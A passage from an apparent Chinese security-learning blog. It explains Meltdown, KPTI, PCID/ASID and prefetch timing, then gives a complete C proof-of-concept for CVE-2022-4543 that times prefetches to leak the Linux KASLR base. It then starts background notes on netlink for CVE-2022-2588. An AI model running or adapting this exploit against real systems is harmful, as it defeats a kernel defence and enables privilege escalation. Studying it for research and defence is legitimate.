<p>这里对上图及上述条件作简单解释：从顶层程序的角度来看，指令A、B和C应该是顺序执行的，且由于指令A访问了非法地址的数据会触发异常，故指令B和C的操作不会被执行；然而，从底层硬件的角度来看，指令A、B和C满足乱序执行的条件，于是在下一指令所需要的数据准备完成后就可以立即开始下一指令的执行。在图中指令A的“阶段A_1”结束后，指令B由于所需要的数据已经准备完成故可立即开始执行；在图中指令B的“阶段B_1”结束后，指令C由于所需要的数据已经准备完成故可立即开始执行。若“阶段A_2”的执行时间大于“阶段B_1”的执行时间和“阶段C_1”的执行时间之和，则非法数据能够经过运算产生合法地址，且该合法地址的数据能够被放入L3_Cache中；若在指令A的“阶段A_2”结束后，检查出非法访问所引起的回滚冲刷不影响L3_Cache，则与非法数据相关的合法数据依然存在于L3_Cache中。最后，通过遍历访问合法地址的数据，并对访问时间进行计时，能够找到某个访问时间明显较短的合法数据，该数据的合法地址即为指令B中由非法数据经过运算后所得到的值，从而可以反推出原非法数据，于是间接地得到了非法地址中的数据。</p>
<h2 id="kpti机制"><a href="#kpti机制" class="headerlink" title="kpti机制"></a>kpti机制</h2><p>简而言之，在没有kpti之前，内核空间和用户空间都是存在同一个页表中，这样做的好处有很多，比如效率高，从用户态切换到内核态的时候不需要切换页表，但也带来了很多问题，比较严重的问题就是内核和用户态的隔离变弱了，导致在用户态就能通过侧信道等一系列手段获得内核态的一些信息，进而对内核进行攻击，比较著名的就是熔毁和幽灵攻击了(Meltdown &amp; Spectre)。</p>
<p>kpti为了解决这一些系列问题应运而生。它为了加强内核态和用户态的隔离，让他们分别处于不同的页表之中，如下图</p>
<p><img src="https://img-blog.csdnimg.cn/20210115200819768.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B3bDk5OQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>进程页表分割成用户态页表和内核态页表的具体方案是什么样的？</p>
<p>1、在运行userapplication 的时候，将kernel mapping 减少到最少，只保留必须的user到kernel的exception entry mapping(<strong>注意这个cve就是利用了这个特性</strong>). 其他的kernel mapping 在运行user application时都去掉,变成无效mapping，这样的话，如果user访问kernel data, 在MMU地址转换的时候就会被挡掉（因为无效mapping).<br>2、设计一个trampoline 的kernel PGD给运行user时用。Trampoline kernel mapping PGD只包含exception entry必需的mapping.<br>3、当user通过系统调用，或是timer或其他异常进入kernel是首先用trampoline的mapping,接下来tramponline的vector处理会将kernel mapping 换成正常的kernel mapping(SWAPPER_PGD_DIR), 并直接跳转到kernel原来的vector entry, 继续正常处理。我们把上述过程称之为map kernel mapping.<br>4、当从kernel返回到user时，正常的kernel_exit会调用trampoline的exit，tramp_exit会重新将kernel mapping 换成是trampoline. 这个过程叫unmap kernel mapping.</p>
<p>这个过程还是比较熟悉的，和xv6的操作系统的实现原理大差不差。</p>
<p>kpti除了上述特性，还引入了pcid/asid,这个我认为才是加强隔离最重要的措施，在没有pcid/asid之前tlb是无法分辨不同进程的页表项的，因为他们的虚拟空间都是重叠的，所以切换进程的时候tlb必须全部刷新，但这个效率太低了，所有进程的内核空间是一样的，所以tlb引入了Global TLB<code>和</code>non-Global TLB,内核pte是Global TLB，用户态pte是non-Global，切换进程的时候只需要刷新non-Global就行，这样tlb就相当于半刷新了。</p>
<p><img src="https://img-blog.csdnimg.cn/20210115200940339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B3bDk5OQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>其实pcid/asid就相当于进程页表标识，每一个进程在运行时，都会动态分配一个pcid/asid，如果进程切换到本进程开始运行，把对应的pcid/asid配置到cr3中</p>
<p><img src="https://img-blog.csdnimg.cn/20210115201000929.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B3bDk5OQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>在进程运行过程中，根据本进程的pgd产生的页表转换关系会缓存到TLB中，所有产生的TLB条目会根据当前cr3中的pcid/asid打上标签。TLB条目有了标签以后，页表切换就不需要去刷新旧的条目了，因为当前cpu只会认和当前cr3中asid相同的TLB条目，这样TLB就不用频繁的去刷新，且相互之间也是隔离的。为了同一进程内的用户态页表和内核态页表隔离，每个进程需要两个asid。用最高位bit11来区分，bit11=0 为内核态asid，bit11=1 为用户态asid。</p>
<p><img src="https://img-blog.csdnimg.cn/20210412145123749.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B3bDk5OQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>简而言之，pcid就是进程之间区分的标识，asid就是同一个进程内核页表和用户态页表区分的标识，这样就在tlb中彻底区分了不同进程的页表项和统一进程不同态的页表项，在tlb层面实现了较为完美的隔离。</p>
<p>在切换进程的时候只需要根据pcid/asid把自己的页表项清除就好了，不需要全刷新或者半刷新。</p>
<h2 id="cpu预取机制"><a href="#cpu预取机制" class="headerlink" title="cpu预取机制"></a>cpu预取机制</h2><p>x86_64有一组预取指令<code>prefetch</code>，这些指令可以将指定地址预取到cpu cache中，当然这个地址也会被刷新到快表tlb中，如果将要预取的地址已经存在在tls中了（就是之前使用过这个地址），那么预取将会快速完成，但是当地址不存在的时候，预取指令将会完成的比较慢，这很好理解，因为之前没有访问过，所以地址对应的pte不在tls中，所以还得遍历页表找到物理地址然后把对应地址数据拷贝到cpu cache,中，比之前者多了两步操作。</p>
<h2 id="CVE-2022-4543攻击思路"><a href="#CVE-2022-4543攻击思路" class="headerlink" title="CVE-2022-4543攻击思路"></a>CVE-2022-4543攻击思路</h2><p>主要的漏洞成因是在用户态页表中映射了<code>entry_SYSCALL_64</code>内核空间，而且和内核态的映射关系是相同的且这个地址到内核态的基地址的偏移是固定的，所以只要在用户态多次进行系统调用,就会在内核态多次执行<code>entry_SYSCALL_64</code>内部的相关函数，这样就会导致这部分地址进入tlb且对应内容会进入cpucache中，这样此时tlb中关于内核态的地址只有这一个，然后再使用预取指令遍历所有的的内核空间，找到所需时间最短的那个地址，这个地址就是<code>entry_SYSCALL_64</code>的地址了。然后再减去固定偏移就得到内核态基地址了。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNEL_LOWER_BOUND 0xffffffff80000000ull</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNEL_UPPER_BOUND 0xffffffffc0000000ull</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> entry_SYSCALL_64_offset 0xd00000ull</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">sidechannel</span><span class="params">(<span class="keyword">uint64_t</span> addr)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> a, b, c, d;</span><br><span class="line">  <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(<span class="string">&quot;.intel_syntax noprefix;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;mfence;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;rdtscp;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;mov %0, rax;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;mov %1, rdx;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;xor rax, rax;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;lfence;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;prefetchnta qword ptr [%4];&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;prefetcht2 qword ptr [%4];&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;xor rax, rax;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;lfence;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;rdtscp;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;mov %2, rax;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;mov %3, rdx;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;mfence;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;.att_syntax;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    : <span class="string">&quot;=r&quot;</span> (a), <span class="string">&quot;=r&quot;</span> (b), <span class="string">&quot;=r&quot;</span> (c), <span class="string">&quot;=r&quot;</span> (d)</span></span></span><br><span class="line"><span class="params"><span class="function">    : <span class="string">&quot;r&quot;</span> (addr)</span></span></span><br><span class="line"><span class="params"><span class="function">    : <span class="string">&quot;rax&quot;</span>, <span class="string">&quot;rbx&quot;</span>, <span class="string">&quot;rcx&quot;</span>, <span class="string">&quot;rdx&quot;</span>)</span></span>;</span><br><span class="line">  a = (b &lt;&lt; <span class="number">32</span>) | a;</span><br><span class="line">  c = (d &lt;&lt; <span class="number">32</span>) | c;</span><br><span class="line">  <span class="keyword">return</span> c - a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STEP 0x100000ull</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SCAN_START KERNEL_LOWER_BOUND + entry_SYSCALL_64_offset</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SCAN_END KERNEL_UPPER_BOUND + entry_SYSCALL_64_offset</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DUMMY_ITERATIONS 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ITERATIONS 100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ARR_SIZE (SCAN_END - SCAN_START) / STEP</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">leak_syscall_entry</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> data[ARR_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">uint64_t</span> min = ~<span class="number">0</span>, addr = ~<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ITERATIONS + DUMMY_ITERATIONS; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">uint64_t</span> idx = <span class="number">0</span>; idx &lt; ARR_SIZE; idx++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">uint64_t</span> test = SCAN_START + idx * STEP;</span><br><span class="line">            syscall(<span class="number">104</span>);</span><br><span class="line">            <span class="keyword">uint64_t</span> time = sidechannel(test);</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= DUMMY_ITERATIONS)</span><br><span class="line">                data[idx] += time;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ARR_SIZE; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        data[i] /= ITERATIONS;</span><br><span class="line">        <span class="keyword">if</span> (data[i] &lt; min)</span><br><span class="line">        &#123;</span><br><span class="line">            min = data[i];</span><br><span class="line">            addr = SCAN_START + i * STEP;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%llx %ld\n&quot;</span>, (SCAN_START + i * STEP), data[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] entry_SYSCALL_6_addr:%p\n&quot;</span>,addr);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">&quot;KASLR base %llx\n&quot;</span>, leak_syscall_entry() - entry_SYSCALL_64_offset);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="攻击效果"><a href="#攻击效果" class="headerlink" title="攻击效果"></a>攻击效果</h3><p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20230131163442189.png" alt="image-20230131163442189"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/08/cve-2022-2588/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/08/cve-2022-2588/" class="post-title-link" itemprop="url">cve-2022-2588</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-02-08 18:57:09 / 修改时间：20:41:25" itemprop="dateCreated datePublished" datetime="2023-02-08T18:57:09+08:00">2023-02-08</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="cve-2022-2588学习"><a href="#cve-2022-2588学习" class="headerlink" title="cve-2022-2588学习"></a>cve-2022-2588学习</h1><p>感觉好牛，看描述是一个exp可以完成多个版本的通杀，因为在exp中并没有使用某一个特定的内核地址，所以就是说这个exp没有地址依赖，没有地址依赖那就没有内核版本限制了。最主要还是想学习一下这个漏洞利用才想着学习这个cve的，但是一看exp人傻了，七八百行，再加上网上的资料很少。。。彳亍。。。一周半起步了。</p>
<h2 id="前置知识浅学"><a href="#前置知识浅学" class="headerlink" title="前置知识浅学"></a>前置知识浅学</h2><h3 id="内核路由表"><a href="#内核路由表" class="headerlink" title="内核路由表"></a>内核路由表</h3><p>不只是路由器需要路由表，主机自己也得有路由表，路由表的作用其实就类似于导航的作用，它告诉主机数据包应该转发到哪里。如果主机不含路由表，那么它所有的数据包都传送不出去。所以不关事路由器，主机也会有自己的路由表。</p>
<p>可以通过<code>route -n</code>来查看主机的路由表,下面是我虚拟机的路由表。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">内核 IP 路由表</span><br><span class="line">目标            网关            子网掩码        标志  跃点   引用  使用 接口</span><br><span class="line">0.0.0.0         192.168.11.2    0.0.0.0         UG    100    0        0 ens33</span><br><span class="line">169.254.0.0     0.0.0.0         255.255.0.0     U     1000   0        0 ens33</span><br><span class="line">172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 docker0</span><br><span class="line">192.168.11.0    0.0.0.0         255.255.255.0   U     100    0        0 ens33</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>一条路由信息主要包括以下几点。</p>
<ul>
<li>目的地址</li>
<li>下一跳地址</li>
<li>子网掩码</li>
<li>网卡接口</li>
</ul>
<h3 id="内核子系统"><a href="#内核子系统" class="headerlink" title="内核子系统"></a>内核子系统</h3><p>linux内核主要由以下七个子系统组成，其中最主要的四个子系统是内存管理子系统、进程管理子系统、网络子系统、虚拟文件系统。</p>
<p><img src="https://sslstatic.ktanx.com/images/release/201507/vCXhMhdY8blZcpZS.png" alt="img"></p>
<p>各个模块的大概依赖如下</p>
<p><img src="https://gss0.baidu.com/9vo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/b219ebc4b74543a9432ff93319178a82b901141c.jpg" alt="image"></p>
<p>稍微对网络子系统和虚拟文件系统做个了解</p>
<p><strong>网络子系统</strong></p>
<p>Linux网络子系统提供了对各种网络标准的存取和各种硬件的支持。下图是其整体结构。其可以分为协议层和网络驱动程序，其中网络协议主要负责实现每一种可能的网络传输协议，而网络驱动程序负责与硬件通信。</p>
<p><img src="https://sslstatic.ktanx.com/images/release/201507/k5OzlWd2Xaj4tCLd.png" alt="img"></p>
<p><strong>虚拟文件系统</strong></p>
<p>Linux虚拟文件系统（VFS）隐藏了各种硬件的具体细节，为所有的设备提供了统一的接口，它是对各种文件系统的一个抽象，其实使用超级块super block存放文件系统相关信息，使用索引节点inode存放文件的物理信息，使用目录项dentry存放文件的逻辑信息，其整体架构如下。</p>
<p><img src="https://sslstatic.ktanx.com/images/release/201507/X0r753n1J4IOqyUk.png" alt="img"></p>
<p><strong>子系统之间通信</strong></p>
<p>内核的子系统之间是互相依赖的，当某个子系统状态发生改变的时候，就必须使用一定的机制告知使用其服务的其他子系统，以便其他子系统采取相应的措施，但到底如何利用netlink进行子系统之间的通信还是没有查到，只知道各个子系统会对不同的消息会有不同的处理措施。</p>
<h3 id="netlink"><a href="#netlink" class="headerlink" title="netlink"></a>netlink</h3><p>内核和用户态进程进行双向通信的一种机制，非常强大，不仅可以支持内核子系统和用户态进程的通信，还可以进行内核中不同子系统之间的通信，但是我在谷歌或者百度中并没有找到相关机制说明和代码演示，只有内核和用户态进程之间通信的代码实践。</p>
<p>创建socket套接字的时候的结构体，和用户态socket的<code>sockaddr_in</code>结构体功能类似。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">sa_family_t</span>    nl_family;    <span class="comment">/*该字段总是为AF_NETLINK    */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span>    nl_pad;        <span class="comment">/* 目前未用到，填充为0*/</span></span><br><span class="line">    __u32        nl_pid;        <span class="comment">/* process pid    */</span></span><br><span class="line">    __u32        nl_groups;    <span class="comment">/* multicast groups mask */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中<code>nl_pid</code>字段比较重要，当有多个用户态进程连接内核时，内核通过这个字段区分不同进程，一般使用<code>getpid()</code>赋值。</p>
<p>netlink消息体如下</p>
<p><img src="https://e-mailky.github.io/images/kernel/23069658_1352297109ObJt.jpg" alt="T3"></p>
<p>消息头结构体如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    __u32        nlmsg_len;    <span class="comment">/* Length of message including header */</span></span><br><span class="line">    __u16        nlmsg_type;    <span class="comment">/* Message content */</span></span><br><span class="line">    __u16        nlmsg_flags;    <span class="comment">/* Additional flags */</span></span><br><span class="line">    __u32        nlmsg_seq;    <span class="comment">/* Sequence number */</span></span><br><span class="line">    __u32        nlmsg_pid;    <span class="comment">/* Sending process PID */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="用户态和内核态双向通信代码示例"><a href="#用户态和内核态双向通信代码示例" class="headerlink" title="用户态和内核态双向通信代码示例"></a>用户态和内核态双向通信代码示例</h4><p>这份代码是基于内核2.x的，不知道如今内核版本是否能用，并未做过实验，仅做记录学习使用。</p>
<p>用户态</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_PAYLOAD 1024 <span class="comment">/*消息最大负载为1024字节*/</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">dest_addr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span>;</span></span><br><span class="line">    <span class="keyword">int</span> sock_fd=<span class="number">-1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == (sock_fd=socket(PF_NETLINK, SOCK_RAW,NETLINK_TEST)))&#123;</span><br><span class="line">          perror(<span class="string">&quot;can&#x27;t create netlink socket!&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;dest_addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(dest_addr));</span><br><span class="line">    dest_addr.nl_family = AF_NETLINK;</span><br><span class="line">    dest_addr.nl_pid = <span class="number">0</span>; <span class="comment">/*我们的消息是发给内核的*/</span></span><br><span class="line">    dest_addr.nl_groups = <span class="number">0</span>; <span class="comment">/*在本示例中不存在使用该值的情况*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == bind(sock_fd, (struct sockaddr*)&amp;dest_addr, <span class="keyword">sizeof</span>(dest_addr)))&#123;</span><br><span class="line">          perror(<span class="string">&quot;can&#x27;t bind sockfd with sockaddr_nl!&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">NULL</span> == (nlh=(struct nlmsghdr *)<span class="built_in">malloc</span>(NLMSG_SPACE(MAX_PAYLOAD))))&#123;</span><br><span class="line">          perror(<span class="string">&quot;alloc mem failed!&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(nlh,<span class="number">0</span>,MAX_PAYLOAD);</span><br><span class="line">    <span class="comment">/* 填充Netlink消息头部 */</span></span><br><span class="line">    nlh-&gt;nlmsg_len = NLMSG_SPACE(MAX_PAYLOAD);</span><br><span class="line">    `nlh-&gt;nlmsg_pid = getpid();<span class="comment">//我们希望得到内核回应，所以得告诉内核我们ID号`</span></span><br><span class="line">    nlh-&gt;nlmsg_type = NLMSG_NOOP; <span class="comment">//指明我们的Netlink是消息负载是一条空消息</span></span><br><span class="line">    nlh-&gt;nlmsg_flags = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*设置Netlink的消息内容，来自我们命令行输入的第一个参数*/</span></span><br><span class="line">    <span class="built_in">strcpy</span>(NLMSG_DATA(nlh), argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*这个是模板，暂时不用纠结为什么要这样用。*/</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;iov, <span class="number">0</span>, <span class="keyword">sizeof</span>(iov));</span><br><span class="line">    iov.iov_base = (<span class="keyword">void</span> *)nlh;</span><br><span class="line">    iov.iov_len = nlh-&gt;nlmsg_len;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    msg.msg_iov = &amp;iov;</span><br><span class="line">    msg.msg_iovlen = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    sendmsg(sock_fd, &amp;msg, <span class="number">0</span>); <span class="comment">//通过Netlink socket向内核发送消息</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//接收内核消息的消息</span></span><br><span 